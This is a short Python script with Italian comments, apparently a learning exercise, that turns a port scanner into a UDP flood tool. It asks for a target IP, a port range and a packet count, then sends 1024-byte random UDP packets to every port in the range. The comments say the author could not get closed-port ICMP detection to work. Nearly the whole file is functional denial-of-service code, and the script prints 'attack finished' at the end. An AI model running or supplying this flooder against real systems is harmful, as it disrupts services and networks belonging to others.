##Port scanner TCP traformato in un UDP Flood che dato in ingresso un IP target e un range di porte, invia un numero di pacchetti UDP scelti dall'utente
#L'unica cosa che non sono riuscito a realizzare e' un controllo di se almeno una delle porte del range sia in ascolto sul protocollo UDP
#Il protocollo UDP non implementa una sessione di comunicazione tra host e client, l'unica cosa che da wired shark ho notato 
#e' che quando una porta e' chiusa si genera un evento ICMP con port unreachable, ma il protocollo ICMP non e' gestito da python
#quindi non ho avuto modo di riuscire a rintracciare l'evento ICMP e cosi avere una variabile di verifica se una porta fosse aperta o meno. 




import socket as so
import random
import time
target = input("Inserici l'ip da scansionare: ")
portrange = input("inserici un range di porte da scansire (es 0-200): ")
numero_pacchetti = int(input("Inserisci quanti pacchetti vuoi inviare(senza essere dolce): "))

lowport = int(portrange.split("-")[0])
highport = int(portrange.split("-")[1])

print(f"Verranno scansite le porte da {lowport} a {highport}")
closePort = []
for port in range(lowport, highport+1):

    s = so.socket(so.AF_INET, so.SOCK_DGRAM)
    
    
    for _ in range(numero_pacchetti):
            
        packet = random._urandom(1024)
            
        try:
            random_delay = random.uniform(0, 0.1)
            #time.sleep(random_delay)#creazione di un ritardo casuale nell'invio dei pacchetti
            print(f"*** Invio verso la porta:{port} ***")
            s.sendto(packet, (target, port))
                
        except Exception as e:
                print(f"C'e' stato un errore :{e}") 
    
    
    s.close()

print("Attacco terminato, spero che c'era qualche porta in UDP aperta")

